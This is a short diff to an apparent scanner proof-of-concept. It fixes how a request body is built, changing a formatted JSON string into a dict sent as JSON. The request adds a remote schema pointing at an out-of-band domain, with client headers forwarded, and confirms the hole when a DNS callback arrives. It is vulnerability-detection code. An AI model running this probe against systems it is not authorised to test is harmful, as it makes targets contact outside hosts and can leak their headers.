@@ -41,26 +41,26 @@ def poc(url):
 
         path = """/v1/query"""
         method = "POST"
-        data = """{
-   "type":"bulk",
-   "args":[
-      {
-         "type":"add_remote_schema",
-         "args":{
-            "name":"test",
-            "definition":{
-               "url":"https://{oob_domain}",
-               "headers":[
-               ],
-               "timeout_seconds":60,
-               "forward_client_headers":true
-            }
-         }
-      }
-   ]
-}""".format(oob_domain=oob_domain)
+        data = {
+            "type":"bulk",
+            "args":[
+                {
+                    "type":"add_remote_schema",
+                    "args":{
+                        "name":"test",
+                        "definition":{
+                        "url":"https://{oob_domain}".format(oob_domain=oob_domain),
+                        "headers":[
+                        ],
+                        "timeout_seconds":60,
+                        "forward_client_headers":True
+                        }
+                    }
+                }
+            ]
+        }
         headers = {'Content-Type': 'application/json', 'Accept': '*/*'}
-        resp0 = requests.request(method=method,url=url+path,data=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
+        resp0 = requests.request(method=method,url=url+path,json=data,headers=headers,timeout=10,verify=False,allow_redirects=False)
 
         if verify_request(type="dns", flag=flag):
             result["success"] = True
